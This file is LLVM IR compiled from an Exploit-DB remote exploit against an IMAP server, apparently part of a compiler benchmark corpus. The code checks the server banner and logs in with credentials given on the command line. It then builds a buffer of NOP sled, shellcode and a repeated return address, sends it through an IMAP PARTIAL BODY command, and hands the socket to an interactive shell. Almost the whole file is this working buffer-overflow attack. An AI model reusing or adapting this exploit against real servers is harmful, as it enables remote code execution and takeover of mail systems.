; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21442.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21442.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.servent = type { i32 }
%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@GOOD_EXIT = common dso_local global i32 0, align 4
@ERROR_EXIT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"imap2\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@DEFAULT_PROTOCOL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [46 x i8] c" [1;34mV\EF\BF\BDrification de la banni\EF\BF\BDre : [0m\0A\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"IMAP4rev1 200\00", align 1
@.str.5 = private unnamed_addr constant [42 x i8] c" [1;32mService IMAPd non reconnu ... [0m\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"x CAPABILITY\0A\00", align 1
@.str.7 = private unnamed_addr constant [52 x i8] c" [1;34mV\EF\BF\BDrification des options du service : [0m\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c" IMAP4 \00", align 1
@.str.9 = private unnamed_addr constant [47 x i8] c" [1;32mService IMAPd non vuln\EF\BF\BDrable ... [0m\0A\00", align 1
@.str.10 = private unnamed_addr constant [43 x i8] c" [1;31mService IMAPd vuln\EF\BF\BDrable ... [0m\0A\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"x LOGIN %s %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"x SELECT Inbox\0A\00", align 1
@sc = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [26 x i8] c"x PARTIAL 1 BODY[%s] 1 1\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"x LOGOUT\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.servent*, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca [4096 x i8], align 16
  %17 = alloca [4096 x i8], align 16
  %18 = alloca [4096 x i8], align 16
  %19 = alloca [2048 x i8], align 16
  %20 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1024, i32* %13, align 4
  %21 = load i32, i32* @GOOD_EXIT, align 4
  store i32 %21, i32* %20, align 4
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 6
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @usage(i8* %27)
  br label %29

29:                                               ; preds = %24, %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 2
  %32 = load i8*, i8** %31, align 8
  store i8* %32, i8** %14, align 8
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 3
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %15, align 8
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 4
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strtoul(i8* %38, i32* null, i32 16)
  store i32 %39, i32* %11, align 4
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 5
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @atoi(i8* %42)
  store i32 %43, i32* %12, align 4
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call %struct.hostent* @gethostbyname(i8* %46)
  store %struct.hostent* %47, %struct.hostent** %8, align 8
  %48 = icmp eq %struct.hostent* %47, null
  br i1 %48, label %49, label %51

49:                                               ; preds = %29
  %50 = load i32, i32* @ERROR_EXIT, align 4
  store i32 %50, i32* %20, align 4
  br label %51

51:                                               ; preds = %49, %29
  %52 = load i32, i32* %20, align 4
  %53 = load i32, i32* @GOOD_EXIT, align 4
  %54 = icmp eq i32 %52, %53
  br i1 %54, label %55, label %60

55:                                               ; preds = %51
  %56 = call %struct.servent* @getservbyname(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  store %struct.servent* %56, %struct.servent** %7, align 8
  %57 = icmp eq %struct.servent* %56, null
  br i1 %57, label %58, label %60

58:                                               ; preds = %55
  %59 = load i32, i32* @ERROR_EXIT, align 4
  store i32 %59, i32* %20, align 4
  br label %60

60:                                               ; preds = %58, %55, %51
  %61 = load i32, i32* %20, align 4
  %62 = load i32, i32* @GOOD_EXIT, align 4
  %63 = icmp eq i32 %61, %62
  br i1 %63, label %64, label %299

64:                                               ; preds = %60
  %65 = load i32, i32* @PF_INET, align 4
  %66 = load i32, i32* @SOCK_STREAM, align 4
  %67 = load i32, i32* @DEFAULT_PROTOCOL, align 4
  %68 = call i32 @socket(i32 %65, i32 %66, i32 %67)
  store i32 %68, i32* %9, align 4
  %69 = icmp slt i32 %68, 0
  br i1 %69, label %70, label %72

70:                                               ; preds = %64
  %71 = load i32, i32* @ERROR_EXIT, align 4
  store i32 %71, i32* %20, align 4
  store i32 %71, i32* %3, align 4
  br label %303

72:                                               ; preds = %64
  %73 = bitcast %struct.sockaddr_in* %6 to i8*
  %74 = call i32 @bzero(i8* %73, i32 12)
  %75 = load %struct.hostent*, %struct.hostent** %8, align 8
  %76 = getelementptr inbounds %struct.hostent, %struct.hostent* %75, i32 0, i32 2
  %77 = load i32, i32* %76, align 4
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %79 = bitcast i32* %78 to i8*
  %80 = load %struct.hostent*, %struct.hostent** %8, align 8
  %81 = getelementptr inbounds %struct.hostent, %struct.hostent* %80, i32 0, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = call i32 @bcopy(i32 %77, i8* %79, i32 %82)
  %84 = load %struct.hostent*, %struct.hostent** %8, align 8
  %85 = getelementptr inbounds %struct.hostent, %struct.hostent* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %86, i32* %87, align 4
  %88 = load %struct.servent*, %struct.servent** %7, align 8
  %89 = getelementptr inbounds %struct.servent, %struct.servent* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 4
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %90, i32* %91, align 4
  %92 = load i32, i32* %9, align 4
  %93 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %94 = call i64 @connect(i32 %92, %struct.sockaddr* %93, i32 12)
  %95 = icmp slt i64 %94, 0
  br i1 %95, label %96, label %98

96:                                               ; preds = %72
  %97 = load i32, i32* @ERROR_EXIT, align 4
  store i32 %97, i32* %20, align 4
  br label %298

98:                                               ; preds = %72
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0))
  %100 = load i32, i32* %9, align 4
  %101 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %102 = call i32 @imap_receive(i32 %100, i8* %101, i32 4096)
  %103 = load i32, i32* @ERROR_EXIT, align 4
  %104 = icmp eq i32 %102, %103
  %105 = zext i1 %104 to i32
  store i32 %105, i32* %20, align 4
  br i1 %104, label %106, label %112

106:                                              ; preds = %98
  %107 = load i32, i32* %9, align 4
  %108 = call i32 @shutdown(i32 %107, i32 2)
  %109 = load i32, i32* %9, align 4
  %110 = call i32 @close(i32 %109)
  %111 = load i32, i32* %20, align 4
  store i32 %111, i32* %3, align 4
  br label %303

112:                                              ; preds = %98
  %113 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %113)
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %116 = call i32* @strstr(i8* %115, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %117 = icmp eq i32* %116, null
  br i1 %117, label %118, label %125

118:                                              ; preds = %112
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0))
  %120 = load i32, i32* %9, align 4
  %121 = call i32 @shutdown(i32 %120, i32 2)
  %122 = load i32, i32* %9, align 4
  %123 = call i32 @close(i32 %122)
  %124 = load i32, i32* %20, align 4
  store i32 %124, i32* %3, align 4
  br label %303

125:                                              ; preds = %112
  %126 = load i32, i32* %9, align 4
  %127 = call i32 @imap_send(i32 %126, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  store i32 %127, i32* %20, align 4
  %128 = load i32, i32* @ERROR_EXIT, align 4
  %129 = icmp eq i32 %127, %128
  br i1 %129, label %130, label %136

130:                                              ; preds = %125
  %131 = load i32, i32* %9, align 4
  %132 = call i32 @shutdown(i32 %131, i32 2)
  %133 = load i32, i32* %9, align 4
  %134 = call i32 @close(i32 %133)
  %135 = load i32, i32* %20, align 4
  store i32 %135, i32* %3, align 4
  br label %303

136:                                              ; preds = %125
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.7, i64 0, i64 0))
  %138 = load i32, i32* %9, align 4
  %139 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %140 = call i32 @imap_receive(i32 %138, i8* %139, i32 4096)
  store i32 %140, i32* %20, align 4
  %141 = load i32, i32* @ERROR_EXIT, align 4
  %142 = icmp eq i32 %140, %141
  br i1 %142, label %143, label %149

143:                                              ; preds = %136
  %144 = load i32, i32* %9, align 4
  %145 = call i32 @shutdown(i32 %144, i32 2)
  %146 = load i32, i32* %9, align 4
  %147 = call i32 @close(i32 %146)
  %148 = load i32, i32* %20, align 4
  store i32 %148, i32* %3, align 4
  br label %303

149:                                              ; preds = %136
  %150 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %150)
  %152 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %153 = call i32* @strstr(i8* %152, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %154 = icmp eq i32* %153, null
  br i1 %154, label %155, label %162

155:                                              ; preds = %149
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.9, i64 0, i64 0))
  %157 = load i32, i32* %9, align 4
  %158 = call i32 @shutdown(i32 %157, i32 2)
  %159 = load i32, i32* %9, align 4
  %160 = call i32 @close(i32 %159)
  %161 = load i32, i32* %20, align 4
  store i32 %161, i32* %3, align 4
  br label %303

162:                                              ; preds = %149
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.10, i64 0, i64 0))
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i64 0, i64 0
  %165 = load i8*, i8** %14, align 8
  %166 = load i8*, i8** %15, align 8
  %167 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %164, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0), i8* %165, i8* %166)
  %168 = load i32, i32* %9, align 4
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i64 0, i64 0
  %170 = call i32 @imap_send(i32 %168, i8* %169)
  store i32 %170, i32* %20, align 4
  %171 = load i32, i32* @ERROR_EXIT, align 4
  %172 = icmp eq i32 %170, %171
  br i1 %172, label %173, label %179

173:                                              ; preds = %162
  %174 = load i32, i32* %9, align 4
  %175 = call i32 @shutdown(i32 %174, i32 2)
  %176 = load i32, i32* %9, align 4
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* %20, align 4
  store i32 %178, i32* %3, align 4
  br label %303

179:                                              ; preds = %162
  %180 = load i32, i32* %9, align 4
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %182 = call i32 @imap_receive(i32 %180, i8* %181, i32 4096)
  store i32 %182, i32* %20, align 4
  %183 = load i32, i32* @ERROR_EXIT, align 4
  %184 = icmp eq i32 %182, %183
  br i1 %184, label %185, label %191

185:                                              ; preds = %179
  %186 = load i32, i32* %9, align 4
  %187 = call i32 @shutdown(i32 %186, i32 2)
  %188 = load i32, i32* %9, align 4
  %189 = call i32 @close(i32 %188)
  %190 = load i32, i32* %20, align 4
  store i32 %190, i32* %3, align 4
  br label %303

191:                                              ; preds = %179
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %192)
  %194 = load i32, i32* %9, align 4
  %195 = call i32 @imap_send(i32 %194, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0))
  store i32 %195, i32* %20, align 4
  %196 = load i32, i32* @ERROR_EXIT, align 4
  %197 = icmp eq i32 %195, %196
  br i1 %197, label %198, label %204

198:                                              ; preds = %191
  %199 = load i32, i32* %9, align 4
  %200 = call i32 @shutdown(i32 %199, i32 2)
  %201 = load i32, i32* %9, align 4
  %202 = call i32 @close(i32 %201)
  %203 = load i32, i32* %20, align 4
  store i32 %203, i32* %3, align 4
  br label %303

204:                                              ; preds = %191
  %205 = load i32, i32* %9, align 4
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %207 = call i32 @imap_receive(i32 %205, i8* %206, i32 4096)
  store i32 %207, i32* %20, align 4
  %208 = load i32, i32* @ERROR_EXIT, align 4
  %209 = icmp eq i32 %207, %208
  br i1 %209, label %210, label %216

210:                                              ; preds = %204
  %211 = load i32, i32* %9, align 4
  %212 = call i32 @shutdown(i32 %211, i32 2)
  %213 = load i32, i32* %9, align 4
  %214 = call i32 @close(i32 %213)
  %215 = load i32, i32* %20, align 4
  store i32 %215, i32* %3, align 4
  br label %303

216:                                              ; preds = %204
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %218 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %217)
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %220 = call i32 @memset(i8* %219, i32 144, i32 2048)
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %222 = getelementptr inbounds i8, i8* %221, i64 512
  %223 = load i32, i32* @sc, align 4
  %224 = load i32, i32* @sc, align 4
  %225 = call i32 @strlen(i32 %224)
  %226 = call i32 @memcpy(i8* %222, i32 %223, i32 %225)
  %227 = load i32, i32* %13, align 4
  %228 = load i32, i32* %12, align 4
  %229 = add nsw i32 %227, %228
  store i32 %229, i32* %10, align 4
  br label %230

230:                                              ; preds = %239, %216
  %231 = load i32, i32* %10, align 4
  %232 = icmp slt i32 %231, 1096
  br i1 %232, label %233, label %242

233:                                              ; preds = %230
  %234 = load i32, i32* %11, align 4
  %235 = load i32, i32* %10, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 %236
  %238 = bitcast i8* %237 to i32*
  store i32 %234, i32* %238, align 1
  br label %239

239:                                              ; preds = %233
  %240 = load i32, i32* %10, align 4
  %241 = add nsw i32 %240, 4
  store i32 %241, i32* %10, align 4
  br label %230

242:                                              ; preds = %230
  %243 = load i32, i32* %10, align 4
  %244 = add nsw i32 %243, 1
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 %245
  %247 = bitcast i8* %246 to i32*
  store i32 0, i32* %247, align 1
  %248 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 0
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %250 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %248, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.13, i64 0, i64 0), i8* %249)
  %251 = load i32, i32* %9, align 4
  %252 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 0
  %253 = call i32 @imap_send(i32 %251, i8* %252)
  store i32 %253, i32* %20, align 4
  %254 = load i32, i32* @ERROR_EXIT, align 4
  %255 = icmp eq i32 %253, %254
  br i1 %255, label %256, label %262

256:                                              ; preds = %242
  %257 = load i32, i32* %9, align 4
  %258 = call i32 @shutdown(i32 %257, i32 2)
  %259 = load i32, i32* %9, align 4
  %260 = call i32 @close(i32 %259)
  %261 = load i32, i32* %20, align 4
  store i32 %261, i32* %3, align 4
  br label %303

262:                                              ; preds = %242
  %263 = load i32, i32* %9, align 4
  %264 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %265 = call i32 @imap_receive(i32 %263, i8* %264, i32 4096)
  store i32 %265, i32* %20, align 4
  %266 = load i32, i32* @ERROR_EXIT, align 4
  %267 = icmp eq i32 %265, %266
  br i1 %267, label %268, label %274

268:                                              ; preds = %262
  %269 = load i32, i32* %9, align 4
  %270 = call i32 @shutdown(i32 %269, i32 2)
  %271 = load i32, i32* %9, align 4
  %272 = call i32 @close(i32 %271)
  %273 = load i32, i32* %20, align 4
  store i32 %273, i32* %3, align 4
  br label %303

274:                                              ; preds = %262
  %275 = load i32, i32* %9, align 4
  %276 = call i32 @imap_send(i32 %275, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0))
  store i32 %276, i32* %20, align 4
  %277 = load i32, i32* @ERROR_EXIT, align 4
  %278 = icmp eq i32 %276, %277
  br i1 %278, label %279, label %285

279:                                              ; preds = %274
  %280 = load i32, i32* %9, align 4
  %281 = call i32 @shutdown(i32 %280, i32 2)
  %282 = load i32, i32* %9, align 4
  %283 = call i32 @close(i32 %282)
  %284 = load i32, i32* %20, align 4
  store i32 %284, i32* %3, align 4
  br label %303

285:                                              ; preds = %274
  %286 = load i32, i32* %9, align 4
  %287 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %288 = call i32 @imap_receive(i32 %286, i8* %287, i32 4096)
  store i32 %288, i32* %20, align 4
  %289 = load i32, i32* @ERROR_EXIT, align 4
  %290 = icmp eq i32 %288, %289
  br i1 %290, label %291, label %297

291:                                              ; preds = %285
  %292 = load i32, i32* %9, align 4
  %293 = call i32 @shutdown(i32 %292, i32 2)
  %294 = load i32, i32* %9, align 4
  %295 = call i32 @close(i32 %294)
  %296 = load i32, i32* %20, align 4
  store i32 %296, i32* %3, align 4
  br label %303

297:                                              ; preds = %285
  br label %298

298:                                              ; preds = %297, %96
  br label %299

299:                                              ; preds = %298, %60
  %300 = load i32, i32* %9, align 4
  %301 = call i32 @interact(i32 %300)
  store i32 %301, i32* %10, align 4
  %302 = load i32, i32* %20, align 4
  store i32 %302, i32* %3, align 4
  br label %303

303:                                              ; preds = %299, %291, %279, %268, %256, %210, %198, %185, %173, %155, %143, %130, %118, %106, %70
  %304 = load i32, i32* %3, align 4
  ret i32 %304
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local %struct.servent* @getservbyname(i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @bcopy(i32, i8*, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @imap_receive(i32, i8*, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32* @strstr(i8*, i8*) #1

declare dso_local i32 @imap_send(i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @interact(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
